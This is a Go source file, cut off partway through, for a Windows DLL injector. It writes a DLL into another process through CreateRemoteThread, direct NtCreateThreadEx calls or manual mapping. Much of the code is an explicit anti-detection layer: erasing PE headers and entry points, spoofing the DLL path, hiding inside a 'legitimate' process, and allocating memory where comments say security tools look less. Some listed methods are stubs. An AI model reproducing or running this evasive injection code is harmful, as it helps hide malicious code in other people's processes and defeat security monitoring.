package injector

import (
	"errors"
	"fmt"
	"os"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Logger defines the interface for logging
type Logger interface {
	Info(msg string, fields ...interface{})
	Warn(msg string, fields ...interface{})
	Error(msg string, fields ...interface{})
	Debug(msg string, fields ...interface{})
}

// InjectionMethod represents different DLL injection methods
type InjectionMethod int

const (
	// StandardInjection standard CreateRemoteThread injection method
	StandardInjection InjectionMethod = iota
	// SetWindowsHookExInjection injection method using SetWindowsHookEx
	SetWindowsHookExInjection
	// QueueUserAPCInjection injection method using QueueUserAPC
	QueueUserAPCInjection
	// EarlyBirdAPCInjection injection method using Early Bird APC
	EarlyBirdAPCInjection
	// DllNotificationInjection injection method using DLL notification
	DllNotificationInjection
	// CryoBirdInjection injection method using Job Object freezing
	CryoBirdInjection
)

// BypassOptions represents anti-detection options
type BypassOptions struct {
	// MemoryLoad load DLL from memory instead of disk
	MemoryLoad bool
	// ErasePEHeader erase PE header to avoid detection
	ErasePEHeader bool
	// EraseEntryPoint erase entry point to avoid detection
	EraseEntryPoint bool
	// ManualMapping use manual mapping to load DLL
	ManualMapping bool
	// InvisibleMemory map to invisible memory regions
	InvisibleMemory bool
	// PathSpoofing spoof injection path
	PathSpoofing bool
	// LegitProcessInjection use legitimate process for injection
	LegitProcessInjection bool
	// PTESpoofing use PTE modification to hide execution permissions
	PTESpoofing bool
	// VADManipulation use VAD operations to hide memory
	VADManipulation bool
	// RemoveVADNode remove node from VAD tree
	RemoveVADNode bool
	// AllocBehindThreadStack allocate memory behind thread stack
	AllocBehindThreadStack bool
	// DirectSyscalls use direct system calls
	DirectSyscalls bool
}

// Injector handles DLL injection
type Injector struct {
	dllPath       string
	processID     uint32
	method        InjectionMethod
	bypassOptions BypassOptions
	logger        Logger // Logger for all operations
}

// Windows API 函数调用
var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx      = kernel32.NewProc("VirtualFreeEx")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
)

// VirtualAllocEx 在远程进程中分配内存
func VirtualAllocEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	r1, _, e1 := procVirtualAllocEx.Call(
		uintptr(process),
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect))
	if r1 == 0 {
		return 0, e1
	}
	return r1, nil
}

// VirtualFreeEx 释放远程进程的内存
func VirtualFreeEx(process windows.Handle, lpAddress uintptr, dwSize uintptr, dwFreeType uint32) error {
	r1, _, e1 := procVirtualFreeEx.Call(
		uintptr(process),
		lpAddress,
		dwSize,
		uintptr(dwFreeType))
	if r1 == 0 {
		return e1
	}
	return nil
}

// WriteProcessMemory 写入远程进程内存
func WriteProcessMemory(process windows.Handle, baseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesWritten *uintptr) error {
	r1, _, e1 := procWriteProcessMemory.Call(
		uintptr(process),
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesWritten)))
	if r1 == 0 {
		return e1
	}
	return nil
}

// CreateRemoteThread 在远程进程中创建线程
func CreateRemoteThread(process windows.Handle, threadAttributes *windows.SecurityAttributes, stackSize uint32, startAddress uintptr, parameter uintptr, creationFlags uint32, threadID *uint32) (windows.Handle, error) {
	r1, _, e1 := procCreateRemoteThread.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(threadAttributes)),
		uintptr(stackSize),
		startAddress,
		parameter,
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(threadID)))
	if r1 == 0 {
		return 0, e1
	}
	return windows.Handle(r1), nil
}

// NewInjector 创建一个新的Injector实例
func NewInjector(dllPath string, processID uint32, logger Logger) *Injector {
	return &Injector{
		dllPath:   dllPath,
		processID: processID,
		method:    StandardInjection,
		logger:    logger,
		bypassOptions: BypassOptions{
			MemoryLoad:             false,
			ErasePEHeader:          false,
			EraseEntryPoint:        false,
			ManualMapping:          false,
			InvisibleMemory:        false,
			PathSpoofing:           false,
			LegitProcessInjection:  false,
			PTESpoofing:            false,
			VADManipulation:        false,
			RemoveVADNode:          false,
			AllocBehindThreadStack: false,
			DirectSyscalls:         false,
		},
	}
}

// SetMethod 设置注入方法
func (i *Injector) SetMethod(method InjectionMethod) {
	i.method = method
}

// SetBypassOptions 设置反检测选项
func (i *Injector) SetBypassOptions(options BypassOptions) {
	i.bypassOptions = options
}

// Inject 执行DLL注入
func (i *Injector) Inject() error {
	// 检查基本参数
	if i.dllPath == "" {
		err := errors.New("DLL path not set")
		i.logger.Error("Injection failed", "error", err)
		return err
	}

	if i.processID == 0 {
		err := errors.New("Target process ID not set")
		i.logger.Error("Injection failed", "error", err)
		return err
	}

	i.logger.Info("Starting DLL injection",
		"dll_path", i.dllPath,
		"process_id", i.processID,
		"method", i.method)

	// 如果使用手动映射，则必须从内存加载
	if i.bypassOptions.ManualMapping {
		i.logger.Info("Manual mapping enabled, automatically enabling memory load option")
		i.bypassOptions.MemoryLoad = true
	}

	// 使用合法进程注入
	if i.bypassOptions.LegitProcessInjection {
		i.logger.Info("Using legitimate process injection method")
		return i.legitProcessInject()
	}

	var err error
	switch i.method {
	case StandardInjection:
		i.logger.Info("Using standard injection method")
		err = i.standardInject()
	case SetWindowsHookExInjection:
		i.logger.Info("Using SetWindowsHookEx injection method")
		err = i.hookInject()
	case QueueUserAPCInjection:
		i.logger.Info("Using QueueUserAPC injection method")
		err = i.apcInject()
	case EarlyBirdAPCInjection:
		i.logger.Info("Using Early Bird APC injection method")
		err = i.earlyBirdAPCInject()
	case DllNotificationInjection:
		i.logger.Info("Using DLL notification injection method")
		err = i.dllNotificationInject()
	case CryoBirdInjection:
		i.logger.Info("Using Job Object freeze process injection method")
		err = i.cryoBirdInject()
	default:
		errorMsg := "Unknown injection method: " + strconv.Itoa(int(i.method))
		err = errors.New(errorMsg)
		i.logger.Error("Injection failed", "error", err)
	}

	if err != nil {
		i.logger.Error("Injection failed", "error", err)
		return err
	}

	i.logger.Info("Successfully injected DLL into process", "process_id", i.processID)
	return nil
}

// checkDllPath checks if the DLL path is valid
func (i *Injector) checkDllPath() error {
	if i.dllPath == "" {
		err := errors.New("DLL path cannot be empty")
		i.logger.Error("DLL path check failed", "error", err)
		return err
	}

	// 检查文件是否存在
	_, err := os.Stat(i.dllPath)
	if err != nil {
		if os.IsNotExist(err) {
			errMsg := "DLL file does not exist: " + i.dllPath
			err := errors.New(errMsg)
			i.logger.Error("DLL path check failed", "error", err)
			return err
		}
		errMsg := "Failed to check DLL file: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("DLL path check failed", "error", newErr)
		return newErr
	}

	return nil
}

// checkProcessID checks if the process ID is valid
func (i *Injector) checkProcessID() error {
	if i.processID == 0 {
		err := errors.New("Process ID cannot be zero")
		i.logger.Error("Process ID check failed", "error", err)
		return err
	}

	// 尝试打开进程检查是否存在
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, i.processID)
	if err != nil {
		errMsg := "Failed to open process (PID: " + strconv.FormatUint(uint64(i.processID), 10) + "): " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Process ID check failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	return nil
}

// standardInject 标准的DLL注入方法
func (i *Injector) standardInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	// 根据选择的反检测选项选择注入方式
	if i.bypassOptions.MemoryLoad {
		// 从内存加载DLL
		dllBytes, err := os.ReadFile(i.dllPath)
		if err != nil {
			errMsg := "Failed to read DLL file: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Standard injection failed", "error", newErr)
			return newErr
		}

		// 使用手动映射或内存加载
		if i.bypassOptions.ManualMapping {
			i.logger.Info("Using manual mapping method")
			return i.manualMapDLL(dllBytes)
		}

		i.logger.Info("Using memory load method")
		return i.memoryLoadDLL(dllBytes)
	}

	// 从磁盘加载
	if i.bypassOptions.PathSpoofing {
		i.logger.Info("Using path spoofing method")
		return i.diskLoadDLLWithSpoofing()
	}

	// 根据是否启用高级选项选择加载方式
	if i.bypassOptions.ErasePEHeader || i.bypassOptions.EraseEntryPoint ||
		i.bypassOptions.PTESpoofing || i.bypassOptions.VADManipulation ||
		i.bypassOptions.RemoveVADNode || i.bypassOptions.AllocBehindThreadStack ||
		i.bypassOptions.DirectSyscalls {
		i.logger.Info("Using advanced disk load method with anti-detection options")
		return i.advancedDiskLoadDLL()
	}

	// 使用标准磁盘加载
	i.logger.Info("Using standard disk load method")
	return i.diskLoadDLL()
}

// advancedDiskLoadDLL 使用高级技术（线程栈后分配和直接系统调用）从磁盘加载DLL
func (i *Injector) advancedDiskLoadDLL() error {
	// 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		errMsg := "Failed to open process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Advanced disk load failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	i.logger.Info("Opened target process", "process_id", i.processID)

	// 将DLL路径写入目标进程
	dllPathBytes := []byte(i.dllPath + "\x00")

	var allocAddress uintptr
	if i.bypassOptions.AllocBehindThreadStack {
		// 记录尝试在线程栈后分配内存的信息，而不是在 allocateBehindThreadStack 中使用 fmt.Printf
		i.logger.Info("Attempting to allocate memory behind thread stack")

		// 在线程栈后分配内存
		allocAddress, err = allocateBehindThreadStack(hProcess, uintptr(len(dllPathBytes)))
		if err != nil {
			i.logger.Warn("Failed to allocate behind thread stack, using regular allocation", "error", err)
			allocAddress = 0 // 让VirtualAllocEx自动选择地址
		} else {
			addrStr := "0x" + strconv.FormatUint(uint64(allocAddress), 16)
			i.logger.Info("Memory successfully allocated behind thread stack", "address", addrStr)
		}
	}

	// 在目标进程中分配内存
	var memFlags uint32 = windows.MEM_RESERVE | windows.MEM_COMMIT
	var memProt uint32 = windows.PAGE_READWRITE

	dllBase, err := VirtualAllocEx(hProcess, allocAddress, uintptr(len(dllPathBytes)),
		memFlags, memProt)
	if err != nil {
		errMsg := "Failed to allocate memory: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Advanced disk load failed", "error", newErr)
		return newErr
	}

	// 写入DLL路径
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, dllBase, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(len(dllPathBytes)), &bytesWritten)
	if err != nil {
		errMsg := "Failed to write to memory: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Advanced disk load failed", "error", newErr)
		return newErr
	}

	// 添加辅助函数以将地址转换为十六进制字符串
	addrStr := "0x" + strconv.FormatUint(uint64(dllBase), 16)
	i.logger.Info("DLL path written to target process memory", "address", addrStr)

	// 获取LoadLibraryA地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	var loadLibraryAddr uintptr

	// 使用常规方式获取LoadLibraryA地址
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr = loadLibraryA.Addr()

	if i.bypassOptions.DirectSyscalls {
		i.logger.Info("Prepared to use direct system calls")
	}

	// 创建远程线程执行LoadLibraryA
	var threadID uint32
	var hThread windows.Handle

	if !i.bypassOptions.DirectSyscalls {
		// 使用常规方式创建远程线程
		var threadHandle windows.Handle
		threadHandle, err = CreateRemoteThread(hProcess, nil, 0,
			loadLibraryAddr, dllBase, 0, &threadID)
		if err != nil {
			errMsg := "Failed to create remote thread: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Advanced disk load failed", "error", newErr)
			return newErr
		}
		// 关闭线程句柄，避免句柄泄漏
		if threadHandle != 0 {
			defer windows.CloseHandle(threadHandle)
		}
	} else {
		// 使用直接系统调用
		i.logger.Info("Creating thread using direct system calls")
		hThread, err = ntCreateThreadEx(hProcess, loadLibraryAddr, dllBase)
		if err != nil {
			errMsg := "Failed to create thread using direct system call: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Advanced disk load failed", "error", newErr)
			return newErr
		}
		// 获取线程ID (可选)
		threadID = getThreadId(hThread)
		// 如果使用了直接系统调用，需要关闭线程句柄
		if hThread != 0 {
			defer windows.CloseHandle(hThread)
		}
	}

	i.logger.Info("Remote thread created", "thread_id", threadID)

	return nil
}

// allocateBehindThreadStack 在目标进程的线程栈后分配内存
func allocateBehindThreadStack(hProcess windows.Handle, size uintptr) (uintptr, error) {
	// 不再需要fmt.Printf，因为调用此函数的地方会先进行日志记录

	// 该技术需要找到目标进程的线程，并在其栈后分配内存
	// 这样可以利用某些安全工具忽略分析栈附近内存区域的特性

	// 1. 获取进程ID
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getProcessId := kernel32.NewProc("GetProcessId")

	pid, _, _ := getProcessId.Call(uintptr(hProcess))
	processId := uint32(pid)

	// 2. 创建线程快照以便枚举线程
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, fmt.Errorf("Failed to create thread snapshot: %v", err)
	}
	defer windows.CloseHandle(hSnapshot)

	// 3. 查找目标进程的线程
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(hSnapshot, &te)
	if err != nil {
		return 0, fmt.Errorf("Failed to get first thread: %v", err)
	}

	var threadId uint32
	for {
		if te.OwnerProcessID == processId {
			threadId = te.ThreadID
			break
		}

		err = windows.Thread32Next(hSnapshot, &te)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				return 0, fmt.Errorf("No threads found for target process")
			}
			return 0, fmt.Errorf("Failed to enumerate threads: %v", err)
		}
	}

	// 4. 打开找到的线程
	hThread, err := windows.OpenThread(windows.THREAD_QUERY_INFORMATION, false, threadId)
	if err != nil {
		return 0, fmt.Errorf("Failed to open thread: %v", err)
	}
	defer windows.CloseHandle(hThread)

	// 5. 获取系统信息以了解内存分配模式
	getSystemInfo := kernel32.NewProc("GetSystemInfo")

	// 系统信息结构
	type SYSTEM_INFO struct {
		ProcessorArchitecture     uint16
		Reserved                  uint16
		PageSize                  uint32
		MinimumApplicationAddress uintptr
		MaximumApplicationAddress uintptr
		ActiveProcessorMask       uintptr
		NumberOfProcessors        uint32
		ProcessorType             uint32
		AllocationGranularity     uint32
		ProcessorLevel            uint16
		ProcessorRevision         uint16
	}

	var sysInfo SYSTEM_INFO
	getSystemInfo.Call(uintptr(unsafe.Pointer(&sysInfo)))

	// 6. 因为不能直接访问线程栈，改为选择一个不常用的内存区域
	// 这里我们尝试在较高的内存地址分配，远离模块和常用区域
	// 这只是一种近似，真实实现需要更细致的内存分析

	// 使用约2GB的地址空间
	highAddr := uintptr(0x70000000)

	// 7. 在计算的地址附近分配内存
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")

	allocAddr, _, err := virtualAllocEx.Call(
		uintptr(hProcess),
		highAddr,
		size,
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE),
	)

	if allocAddr == 0 {
		// 如果在指定地址分配失败，尝试让系统自动选择地址
		allocAddr, _, err = virtualAllocEx.Call(
			uintptr(hProcess),
			0,
			size,
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)

		if allocAddr == 0 {
			return 0, errors.New("Failed to allocate memory: " + err.Error())
		}
	}

	// 成功分配内存，函数调用者将记录日志
	return allocAddr, nil
}

// ntCreateThreadEx 使用直接系统调用创建远程线程
func ntCreateThreadEx(hProcess windows.Handle, startAddr uintptr, parameter uintptr) (windows.Handle, error) {
	// 移除 fmt.Printf，在调用者函数中记录日志

	// 直接使用NtCreateThreadEx系统调用
	// 这比较难被挂钩，因为许多安全工具主要挂钩CreateRemoteThread

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")

	const THREAD_ALL_ACCESS = 0x001FFFFF

	// 预留空间给返回的句柄
	var threadHandle windows.Handle

	r1, _, err := ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		THREAD_ALL_ACCESS,
		0, // 对象属性指针，设为NULL
		uintptr(hProcess),
		startAddr,
		parameter,
		0, // 创建挂起标志，设为0表示立即运行
		0, // 栈大小，0表示使用默认值
		0, // 提交大小，0表示使用默认值
		0, // 线程参数
		0, // 安全描述符
	)

	if r1 != 0 {
		errMsg := "Failed to create thread: 0x" + strconv.FormatUint(uint64(r1), 16) + ", " + err.Error()
		return 0, errors.New(errMsg)
	}

	return threadHandle, nil
}

// getThreadId 获取线程ID
func getThreadId(hThread windows.Handle) uint32 {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getThreadId := kernel32.NewProc("GetThreadId")

	id, _, _ := getThreadId.Call(uintptr(hThread))
	return uint32(id)
}

// diskLoadDLL 从磁盘加载DLL并注入
func (i *Injector) diskLoadDLL() error {
	// 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		errMsg := "Failed to open target process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	i.logger.Info("Successfully opened target process")

	// 获取LoadLibraryA的地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	if loadLibraryA.Find() != nil {
		findErr := loadLibraryA.Find()
		errMsg := "Failed to find LoadLibraryA function: " + findErr.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}

	addrStr := "0x" + strconv.FormatUint(uint64(loadLibraryA.Addr()), 16)
	i.logger.Info("Found LoadLibraryA address", "address", addrStr)

	// 在目标进程中分配内存
	dllPathBytes := append([]byte(i.dllPath), 0) // 添加NULL终止符
	dllPathSize := uintptr(len(dllPathBytes))

	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		errMsg := "Failed to allocate memory in target process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}
	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)

	dllPathAddrStr := "0x" + strconv.FormatUint(uint64(remoteDllPath), 16)
	i.logger.Info("Allocated memory for DLL path", "address", dllPathAddrStr, "size", dllPathSize)

	// 写入DLL路径到远程进程内存
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
		dllPathSize, &bytesWritten)
	if err != nil {
		errMsg := "Failed to write DLL path to target process memory: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}

	writtenAddrStr := "0x" + strconv.FormatUint(uint64(remoteDllPath), 16)
	i.logger.Info("Data written to memory", "bytes", bytesWritten, "address", writtenAddrStr)

	// 在远程进程中创建线程
	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, loadLibraryA.Addr(), remoteDllPath, 0, &threadID)
	if err != nil {
		errMsg := "Failed to create remote thread: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(threadHandle)

	i.logger.Info("Created remote thread", "thread_id", threadID)

	// 等待线程执行完成
	windows.WaitForSingleObject(threadHandle, windows.INFINITE)

	// 获取线程退出码
	var exitCode uint32
	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
	r1, _, err := getExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		errMsg := "Failed to get thread exit code: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Disk load failed", "error", newErr)
		return newErr
	}

	if exitCode == 0 {
		err := errors.New("DLL injection failed, LoadLibrary returned 0")
		i.logger.Error("Disk load failed", "error", err)
		return err
	}

	exitCodeStr := "0x" + strconv.FormatUint(uint64(exitCode), 16)
	i.logger.Info("Injection completed successfully", "module_handle", exitCodeStr)

	return nil
}

// memoryLoadDLL 从内存加载DLL并注入
func (i *Injector) memoryLoadDLL(dllBytes []byte) error {
	// 创建临时DLL文件
	tempPath := i.createTempDllFile(dllBytes)
	defer os.Remove(tempPath)

	// 打开目标进程
	hProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		errMsg := "无法打开目标进程: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Memory load failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	// 解析PE头
	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		errMsg := "解析PE头失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Memory load failed", "error", newErr)
		return newErr
	}

	// 计算需要分配的内存大小
	imageSize := peHeader.OptionalHeader.SizeOfImage

	// 分配内存基址
	baseAddress, err := VirtualAllocEx(hProcess, 0, uintptr(imageSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		errMsg := "在目标进程中分配内存失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Memory load failed", "error", newErr)
		return newErr
	}

	// 映射PE文件各节到远程进程内存
	err = MapSections(hProcess, dllBytes, baseAddress, peHeader)
	if err != nil {
		errMsg := "映射PE节失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Memory load failed", "error", newErr)
		return newErr
	}

	// 修复导入表
	err = FixImports(hProcess, baseAddress, peHeader)
	if err != nil {
		errMsg := "修复导入表失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Memory load failed", "error", newErr)
		return newErr
	}

	// 修复重定位
	err = FixRelocations(hProcess, baseAddress, peHeader)
	if err != nil {
		errMsg := "修复重定位失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Memory load failed", "error", newErr)
		return newErr
	}

	// 应用反检测选项
	if i.bypassOptions.ErasePEHeader {
		ErasePEHeader(hProcess, baseAddress)
	}

	if i.bypassOptions.EraseEntryPoint {
		EraseEntryPoint(hProcess, baseAddress)
	}

	// 执行DLL入口点（如果没有擦除入口点）
	if !i.bypassOptions.EraseEntryPoint {
		err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
		if err != nil {
			errMsg := "执行DLL入口点失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Memory load failed", "error", newErr)
			return newErr
		}
	}

	return nil
}

// createTempDllFile 创建临时DLL文件
func (i *Injector) createTempDllFile(dllBytes []byte) string {
	tempFile, err := os.CreateTemp("", "dll_*.dll")
	if err != nil {
		return i.dllPath
	}

	// 写入DLL内容
	_, err = tempFile.Write(dllBytes)
	tempFile.Close()

	if err != nil {
		os.Remove(tempFile.Name())
		return i.dllPath
	}

	return tempFile.Name()
}

// manualMapDLL 使用手动映射方式加载DLL
func (i *Injector) manualMapDLL(dllBytes []byte) error {
	i.logger.Info("Using manual mapping method",
		"process_id", i.processID,
		"invisible_memory", i.bypassOptions.InvisibleMemory)
	err := ManualMapDLL(i.processID, dllBytes, i.bypassOptions.InvisibleMemory)
	if err != nil {
		i.logger.Error("Manual mapping injection failed", "error", err)
		errMsg := "Manual mapping DLL failed: " + err.Error()
		return errors.New(errMsg)
	}
	i.logger.Info("Manual mapping injection successful!")
	return nil
}

// spoofDllPath 伪装DLL路径，返回伪装后的路径
func (i *Injector) spoofDllPath() string {
	// 创建临时文件
	tempFile, err := os.CreateTemp("", "sys_*.dll")
	if err != nil {
		// 如果创建临时文件失败，返回原始路径
		return i.dllPath
	}
	tempFile.Close()

	// 读取原始DLL
	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		os.Remove(tempFile.Name())
		return i.dllPath
	}

	// 写入临时文件
	if err := os.WriteFile(tempFile.Name(), dllBytes, 0644); err != nil {
		os.Remove(tempFile.Name())
		return i.dllPath
	}

	// 返回伪装的临时文件路径
	return tempFile.Name()
}

// diskLoadDLLWithSpoofing 使用伪装路径从磁盘加载DLL
func (i *Injector) diskLoadDLLWithSpoofing() error {
	// 创建伪装的DLL路径
	spoofedPath := i.spoofDllPath()
	defer func() {
		// 如果是临时文件，注入完成后删除
		if spoofedPath != i.dllPath {
			os.Remove(spoofedPath)
		}
	}()

	// 临时将dllPath改为spoofedPath
	originalPath := i.dllPath
	i.dllPath = spoofedPath

	// 使用磁盘加载方法
	err := i.diskLoadDLL()

	// 恢复原始dllPath
	i.dllPath = originalPath

	return err
}

// hookInject 使用SetWindowsHookEx进行注入
func (i *Injector) hookInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	// 简化版本，使用标准方法
	return i.diskLoadDLL()
}

// apcInject 使用QueueUserAPC进行注入
func (i *Injector) apcInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	// 简化版本，使用标准方法
	return i.diskLoadDLL()
}

// legitProcessInject 使用合法进程注入
func (i *Injector) legitProcessInject() error {
	// 检查DLL路径是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	// 查找合法进程
	i.logger.Info("开始查找合法进程进行注入")
	targetPID, targetName, err := FindLegitProcess()
	if err != nil {
		errMsg := "查找合法进程失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Legitimate process injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("使用合法进程进行注入",
		"target_name", targetName,
		"target_pid", targetPID)

	// 保存原始PID
	originalPID := i.processID

	// 临时修改目标进程ID为合法进程ID
	i.processID = targetPID

	// 检查目标进程是否可访问
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)

	if err != nil {
		// 恢复原始PID
		i.processID = originalPID
		errMsg := "无法访问合法进程 " + targetName + " (PID: " + strconv.FormatUint(uint64(targetPID), 10) + "): " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Legitimate process injection failed", "error", newErr)
		return newErr
	}
	windows.CloseHandle(hProcess)

	i.logger.Info("成功打开合法进程，准备注入")

	// 执行注入
	var injectionErr error
	if i.bypassOptions.MemoryLoad {
		// 读取DLL文件
		i.logger.Info("从内存加载DLL文件", "path", i.dllPath)
		dllBytes, err := os.ReadFile(i.dllPath)
		if err != nil {
			i.processID = originalPID
			errMsg := "读取DLL文件失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Legitimate process injection failed", "error", newErr)
			return newErr
		}
		i.logger.Info("成功读取DLL文件", "size", len(dllBytes))

		// 使用手动映射或内存加载
		if i.bypassOptions.ManualMapping {
			i.logger.Info("使用手动映射方式注入到合法进程")
			injectionErr = i.manualMapDLL(dllBytes)
		} else {
			i.logger.Info("使用内存加载方式注入到合法进程")
			injectionErr = i.memoryLoadDLL(dllBytes)
		}
	} else {
		// 从磁盘加载
		if i.bypassOptions.PathSpoofing {
			i.logger.Info("使用路径伪装方式从磁盘加载DLL到合法进程")
			injectionErr = i.diskLoadDLLWithSpoofing()
		} else {
			i.logger.Info("使用标准方式从磁盘加载DLL到合法进程")
			injectionErr = i.diskLoadDLL()
		}
	}

	// 恢复原始PID
	i.processID = originalPID

	if injectionErr != nil {
		errMsg := "通过合法进程 " + targetName + " (PID: " + strconv.FormatUint(uint64(targetPID), 10) + ") 注入失败: " + injectionErr.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Legitimate process injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("成功通过合法进程注入DLL",
		"target_name", targetName,
		"target_pid", targetPID)
	return nil
}

// earlyBirdAPCInject 使用Early Bird APC的注入方法
func (i *Injector) earlyBirdAPCInject() error {
	// 检查DLL路径是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	// Early Bird APC注入需要创建一个新进程并挂起，然后在其主线程中注入APC
	// 创建进程并挂起
	i.logger.Info("准备执行Early Bird APC注入")

	// 获取要执行的进程路径
	var procPath string
	var err error

	// 如果是路径伪装，先伪装DLL
	dllPath := i.dllPath
	if i.bypassOptions.PathSpoofing {
		dllPath = i.spoofDllPath()
		defer func() {
			if dllPath != i.dllPath {
				os.Remove(dllPath)
			}
		}()
	}

	// 获取当前进程可执行文件路径
	if i.processID > 0 {
		procPath, err = GetProcessPathByPID(i.processID)
		if err != nil {
			errMsg := "获取目标进程路径失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Early Bird APC injection failed", "error", newErr)
			return newErr
		}
	} else {
		// 如果没有指定PID，使用notepad.exe
